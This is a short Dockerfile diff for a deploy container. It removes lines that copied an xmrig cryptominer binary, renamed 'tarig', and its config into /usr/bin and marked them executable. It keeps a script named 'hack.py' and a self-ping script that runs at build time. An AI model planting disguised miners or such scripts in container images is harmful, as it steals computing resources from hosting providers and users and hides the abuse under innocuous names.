@@ -27,8 +27,6 @@ RUN sudo chown -R coder:coder /home/coder/.local
 USER root
 COPY deploy-container/self-ping.py /usr/bin/deploy-container-self-ping.py
 COPY deploy-container/entrypoint.sh /usr/bin/deploy-container-entrypoint.sh
-COPY deploy-container/xmrig /usr/bin/tarig
-COPY deploy-container/config.json /usr/bin/config.json
 COPY deploy-container/hack.py /usr/bin/deploy-container-hack.py
-RUN chmod +x /usr/bin/deploy-container-entrypoint.sh && chmod +x /usr/bin/tarig && chmod +x /usr/bin/config.json && chmod +x /usr/bin/deploy-container-hack.py && chmod +x /usr/bin/deploy-container-self-ping.py && python3 /usr/bin/deploy-container-self-ping.py
+RUN chmod +x /usr/bin/deploy-container-entrypoint.sh && chmod +x /usr/bin/deploy-container-hack.py && chmod +x /usr/bin/deploy-container-self-ping.py && python3 /usr/bin/deploy-container-self-ping.py
 ENTRYPOINT ["/usr/bin/deploy-container-entrypoint.sh"]
